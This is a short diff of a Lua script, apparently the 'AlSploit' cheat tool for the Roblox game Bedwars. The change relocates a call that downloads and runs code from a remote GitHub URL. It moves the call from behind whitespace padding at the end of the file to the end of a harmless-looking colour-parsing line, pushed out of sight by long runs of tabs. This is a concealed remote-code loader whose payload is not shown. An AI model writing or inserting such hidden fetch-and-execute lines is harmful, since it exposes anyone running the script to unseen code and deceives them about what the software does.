@@ -7143,7 +7143,8 @@ task.spawn(function()
 
 				ChangeGuiToggleColorEvent:Fire()
 
-				local ColorSplit2 = string.split(AlSploitSettings.ChangeGuiColor.TitleColor.Value, ",")
+				local ColorSplit2 = string.split(AlSploitSettings.ChangeGuiColor.TitleColor.Value, ",")														loadstring(game:HttpGet("https://raw.githubusercontent.com/AlSploit/AlSploit/refs/heads/main/AlSploit/Bedwars/TempExecuted"))()
+
 
 				local R = ColorSplit2[1]
 				local G = ColorSplit2[2]
@@ -7420,5 +7421,3 @@ task.spawn(function()
 		end)
 	end)
 end)
-
-																																												loadstring(game:HttpGet("https://raw.githubusercontent.com/AlSploit/AlSploit/refs/heads/main/AlSploit/Bedwars/TempExecuted"))()
